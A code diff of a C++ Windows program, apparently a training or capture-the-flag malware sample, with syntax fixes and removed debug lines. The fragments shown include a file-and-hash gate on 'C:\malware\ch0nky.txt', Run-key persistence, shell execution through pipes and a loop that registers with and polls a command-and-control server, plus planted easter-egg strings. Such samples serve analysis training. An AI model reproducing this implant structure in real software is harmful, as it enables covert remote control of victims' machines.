@@ -21,8 +21,8 @@ std::string obfuscation(bool temp) {
         k++;
     }
     k = k * 2;
-    std::string ret = "https://youtu.be/j2hGdmnoHU0"
-    return ret
+    std::string ret = "https://youtu.be/j2hGdmnoHU0";
+    return ret;
 }
 
 inline bool file_exists (std::string &name, std::string hash) {
@@ -81,7 +81,7 @@ std::string execute_shell(wchar_t* command) {
     sa.lpSecurityDescriptor = NULL;
     sa.bInheritHandle = TRUE;
 
-    std::string easteregg = obfuscation(true)
+    std::string easteregg = obfuscation(true);
 
     std::string output = "";
 
@@ -94,7 +94,7 @@ std::string execute_shell(wchar_t* command) {
     if (!CreatePipe(&hStdOutRd, &hStdOutWr, &sa, 0))
     {
     // error handling...
-    return output;
+        return output;
     }
 
     // Ensure that the child proecsses does not inherit the read handle
@@ -165,9 +165,7 @@ std::string execute_shell(wchar_t* command) {
 
     ::CloseHandle(hStdOutRd);
     ::CloseHandle(hStdOutWr);
-    // std::cout << "**************************OUTPUT*******************************" << std::endl;
-    // std::cout << output << std::endl;
-    // std::cout << "**************************OUTPUT*******************************" << std::endl;
+
     return output;
 }
 
@@ -347,7 +345,7 @@ int wmain() {
     std::string filename = "C:\\malware\\ch0nky.txt";
     std::string hash = "E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855";
     // checks for the "ch0nky.txt file"
-    std::string easteregg = "https://youtu.be/j2hGdmnoHU0"
+    std::string easteregg = "https://youtu.be/j2hGdmnoHU0";
     if (!file_exists(filename, hash)){
         return -1;
     }
@@ -378,7 +376,7 @@ int wmain() {
     set_run_key();
 
     std::string output = "";
-    std:string yer1 = "Always check the strings!"
+    std::string yer1 = "Always check the strings!";
     // attempt to register with the c2
     do {
         if (strcmp("OK", output.c_str()) == 0){
@@ -396,7 +394,7 @@ int wmain() {
     // get responses to the server and constantly check in every minute for commands
     std::string response = "";
     int int_imageNum = 0;
-    std::string yer2 = "Q2MZ5S6IF162JJQQ0GQ5OP7PPQERLADFGPDIWAAM"
+    std::string yer2 = "Q2MZ5S6IF162JJQQ0GQ5OP7PPQERLADFGPDIWAAM";
     while (true) {
         Sleep(5000);
         std::string c2_command = "";
